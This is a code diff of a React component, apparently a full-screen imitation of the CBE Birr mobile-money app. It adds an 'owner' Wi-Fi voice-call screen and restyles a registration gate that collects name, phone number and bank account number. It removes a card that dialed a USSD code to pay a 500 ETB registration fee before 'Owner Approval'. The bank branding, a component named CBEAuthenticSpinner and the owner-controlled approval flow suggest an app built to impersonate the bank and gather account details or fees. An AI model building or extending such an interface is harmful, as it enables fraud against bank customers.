+          )}
+        </AnimatePresence>
+
+        {/* Full-Screen Incoming Owner Wi-Fi VoIP Call Screen (Real Ringtone + Vibrate + Answer/Decline) */}
+        <AnimatePresence>
+          {clientCallSession?.status === 'ringing' && !showOwnerDashboard && (
+            <motion.div
+              data-support-ignore="true"
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              className="absolute inset-0 z-[96] bg-gradient-to-b from-[#0b192c] via-[#0e223d] to-[#07101c] text-white flex flex-col items-center justify-between p-6 select-none"
+            >
+              <div className="pt-4 text-center space-y-1">
+                <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-sky-500/20 border border-sky-400/35 text-sky-200 text-[2.4cqw] font-bold">
+                  <Radio className="w-3.5 h-3.5 animate-pulse" />
+                  <span>Incoming Wi-Fi Voice Call</span>
+                </div>
+              </div>
+
+              <div className="flex flex-col items-center text-center space-y-4 my-auto">
+                <div className="relative">
+                  <span className="absolute inset-0 rounded-full bg-emerald-400/30 animate-ping" />
+                  <div className="relative w-24 h-24 rounded-full bg-emerald-500/20 border-2 border-emerald-400 flex items-center justify-center shadow-2xl">
+                    <PhoneIncoming className="w-10 h-10 text-emerald-300" />
+                  </div>
+                </div>
+                <div className="space-y-1">
+                  <h2 className="text-[5.2cqw] font-bold text-white">
+                    {clientCallSession.callerName || 'Owner Wi-Fi Call'}
+                  </h2>
+                  <p className="text-[3cqw] text-sky-200/80">
+                    Real-time Wi-Fi audio call
+                  </p>
+                </div>
+              </div>
+
+              <div className="w-full max-w-[290px] grid grid-cols-2 gap-4 pb-6">
+                <button
+                  type="button"
+                  disabled={clientCallBusy}
+                  onClick={handleDeclineIncomingCall}
+                  className="py-3.5 rounded-2xl bg-rose-600 hover:bg-rose-500 text-white font-bold text-[3.3cqw] flex flex-col items-center justify-center gap-1 shadow-xl cursor-pointer"
+                >
+                  <PhoneOff className="w-6 h-6" />
+                  <span>Decline</span>
+                </button>
+                <button
+                  type="button"
+                  disabled={clientCallBusy}
+                  onClick={() => void handleAnswerIncomingCall()}
+                  className="py-3.5 rounded-2xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-[3.3cqw] flex flex-col items-center justify-center gap-1 shadow-xl cursor-pointer"
+                >
+                  <PhoneCall className="w-6 h-6" />
+                  <span>Answer</span>
+                </button>
+              </div>
             </motion.div>
           )}
         </AnimatePresence>
@@ -11850,10 +13299,10 @@ export default function CBEBirrFullscreenApp() {
         )}
 
         {deviceGateState === 'register' && (
-          <div className="absolute inset-0 z-[92] bg-[#f7f4f8] flex flex-col justify-between p-5 overflow-y-auto select-none">
-            <div className="w-full max-w-[345px] mx-auto my-auto bg-white rounded-3xl shadow-xl border border-purple-100 p-5 space-y-4">
-              <div className="flex flex-col items-center text-center gap-1.5">
-                <div className="w-14 h-14 rounded-2xl overflow-hidden shadow-md bg-[#7a1c7d] flex items-center justify-center">
+          <div className="absolute inset-0 z-[92] bg-[#f7f4f8] flex flex-col justify-between p-6 overflow-y-auto select-none">
+            <div className="w-full max-w-[340px] mx-auto my-auto bg-white rounded-3xl shadow-xl border border-purple-100 p-6 space-y-5">
+              <div className="flex flex-col items-center text-center gap-2">
+                <div className="w-16 h-16 rounded-2xl overflow-hidden shadow-md bg-[#7a1c7d] flex items-center justify-center">
                   {/* eslint-disable-next-line @next/next/no-img-element */}
                   <img
                     src="/assets/cbe_birr_logo.png"
@@ -11862,14 +13311,14 @@ export default function CBEBirrFullscreenApp() {
                     draggable={false}
                   />
                 </div>
-                <h1 className="text-[19px] font-bold text-[#7a1c7d] tracking-tight">
+                <h1 className="text-[4.5cqw] font-bold text-[#7a1c7d] tracking-tight">
                   Register
                 </h1>
               </div>
 
-              <form onSubmit={handleSubmitDeviceRegistration} className="space-y-3.5">
-                <div className="space-y-1">
-                  <label className="block text-[12px] font-semibold text-slate-700">
+              <form onSubmit={handleSubmitDeviceRegistration} className="space-y-4">
+                <div className="space-y-1.5">
+                  <label className="block text-[2.8cqw] font-semibold text-slate-700">
                     Full Name
                   </label>
                   <input
@@ -11881,12 +13330,12 @@ export default function CBEBirrFullscreenApp() {
                     }}
                     placeholder="Enter your full name"
                     autoComplete="name"
-                    className="w-full px-3.5 py-2.5 rounded-xl bg-slate-50 border border-slate-200 focus:border-[#7a1c7d] focus:bg-white text-[14px] text-slate-900 outline-none transition-colors"
+                    className="w-full px-3.5 py-3 rounded-xl bg-slate-50 border border-slate-200 focus:border-[#7a1c7d] focus:bg-white text-[3.2cqw] text-slate-900 outline-none transition-colors"
                   />
                 </div>
 
-                <div className="space-y-1">
-                  <label className="block text-[12px] font-semibold text-slate-700">
+                <div className="space-y-1.5">
+                  <label className="block text-[2.8cqw] font-semibold text-slate-700">
                     Phone Number
                   </label>
                   <input
@@ -11899,12 +13348,12 @@ export default function CBEBirrFullscreenApp() {
                     }}
                     placeholder="09XXXXXXXX"
                     autoComplete="tel"
-                    className="w-full px-3.5 py-2.5 rounded-xl bg-slate-50 border border-slate-200 focus:border-[#7a1c7d] focus:bg-white text-[14px] text-slate-900 outline-none transition-colors"
+                    className="w-full px-3.5 py-3 rounded-xl bg-slate-50 border border-slate-200 focus:border-[#7a1c7d] focus:bg-white text-[3.2cqw] text-slate-900 outline-none transition-colors"
                   />
                 </div>
 
-                <div className="space-y-1">
-                  <label className="block text-[12px] font-semibold text-slate-700">
+                <div className="space-y-1.5">
+                  <label className="block text-[2.8cqw] font-semibold text-slate-700">
                     Account Number
                   </label>
                   <input
@@ -11916,59 +13365,12 @@ export default function CBEBirrFullscreenApp() {
                       if (regError) setRegError('');
                     }}
                     placeholder="1000XXXXXXXXX"
-                    className="w-full px-3.5 py-2.5 rounded-xl bg-slate-50 border border-slate-200 focus:border-[#7a1c7d] focus:bg-white text-[14px] text-slate-900 outline-none transition-colors"
+                    className="w-full px-3.5 py-3 rounded-xl bg-slate-50 border border-slate-200 focus:border-[#7a1c7d] focus:bg-white text-[3.2cqw] text-slate-900 outline-none transition-colors"
                   />
                 </div>
 
-                {/* Registration Payment USSD Card (Controlled via Owner Control / Ram Control) */}
-                <div className="rounded-2xl bg-[#f9f4fa] border border-purple-200/80 p-3.5 space-y-2.5">
-                  <div className="flex items-center justify-between gap-2">
-                    <div className="min-w-0">
-                      <p className="text-[11px] font-semibold text-[#7a1c7d]">
-                        Registration Payment
-                      </p>
-                      <p className="text-[15px] font-bold text-slate-900 tabular-nums">
-                        {activeRegUssdCommand.amount || '500'} ETB
-                      </p>
-                    </div>
-                    <button
-                      type="button"
-                      onClick={() => void refreshRegUssdConfig()}
-                      disabled={regUssdRefreshing}
-                      className="min-h-[36px] min-w-[36px] rounded-xl bg-white border border-purple-200 flex items-center justify-center text-[#7a1c7d] cursor-pointer"
-                      aria-label="Refresh payment USSD"
-                    >
-                      <RefreshCw className={`w-3.5 h-3.5 ${regUssdRefreshing ? 'animate-spin' : ''}`} />
-                    </button>
-                  </div>
-
-                  <div className="rounded-xl bg-white border border-purple-100 px-2.5 py-1.5 flex items-center justify-between gap-2">
-                    <span className="text-[11px] font-mono text-slate-700 break-all tabular-nums">
-                      {activeRegUssdCommand.displayCode}
-                    </span>
-                  </div>
-
-                  <button
-                    type="button"
-                    onClick={() => runRegistrationPaymentUssd()}
-                    className="w-full min-h-[44px] py-2.5 px-4 rounded-xl bg-[#007a4d] hover:bg-[#006640] active:scale-[0.99] text-white font-bold text-[13.5px] flex items-center justify-center gap-2 shadow-sm transition-all cursor-pointer"
-                  >
-                    <Phone className="w-4 h-4 shrink-0" />
-                    <span>
-                      Pay {activeRegUssdCommand.amount || '500'} ETB (Run USSD)
-                    </span>
-                  </button>
-
-                  {regUssdTriggered && (
-                    <p className="text-[11px] font-medium text-emerald-700 flex items-center justify-center gap-1 text-center">
-                      <CheckCircle2 className="w-3.5 h-3.5 shrink-0" />
-                      <span>USSD dialed. Tap Next to wait for Owner Approval.</span>
-                    </p>
-                  )}
-                </div>
-
                 {regError && (
-                  <p className="text-[12px] font-medium text-rose-600 text-center">
+                  <p className="text-[2.7cqw] font-medium text-rose-600 text-center">
                     {regError}
                   </p>
                 )}
@@ -11976,7 +13378,7 @@ export default function CBEBirrFullscreenApp() {
                 <button
                   type="submit"
                   disabled={regSubmitting}
-                  className="w-full min-h-[46px] py-3 rounded-xl bg-[#7a1c7d] hover:bg-[#661468] active:scale-[0.99] text-white font-bold text-[15px] shadow-md transition-all cursor-pointer disabled:opacity-60"
+                  className="w-full py-3.5 rounded-xl bg-[#7a1c7d] hover:bg-[#661468] active:scale-[0.99] text-white font-bold text-[3.4cqw] shadow-md transition-all cursor-pointer disabled:opacity-60"
                 >
                   Next
                 </button>
@@ -11989,7 +13391,7 @@ export default function CBEBirrFullscreenApp() {
           <div className="absolute inset-0 z-[92] bg-[#f7f4f8] flex flex-col items-center justify-center p-6 select-none">
             <div className="bg-white rounded-3xl shadow-xl border border-purple-100 px-8 py-7 flex flex-col items-center text-center gap-4 max-w-[280px] w-full">
               <CBEAuthenticSpinner size={44} color="#7a1c7d" speed={0.95} />
-              <p className="text-[14px] font-semibold text-slate-700">
+              <p className="text-[3.3cqw] font-semibold text-slate-700">
                 Loading...
               </p>
             </div>
@@ -12001,7 +13403,7 @@ export default function CBEBirrFullscreenApp() {
             <div className="w-14 h-14 rounded-full bg-rose-500/20 border border-rose-400/30 flex items-center justify-center mb-3">
               <X className="w-7 h-7 text-rose-400" />
             </div>
-            <p className="text-[15px] font-bold text-white">Access Denied</p>
+            <p className="text-[3.5cqw] font-bold text-white">Access Denied</p>
           </div>
         )}
 
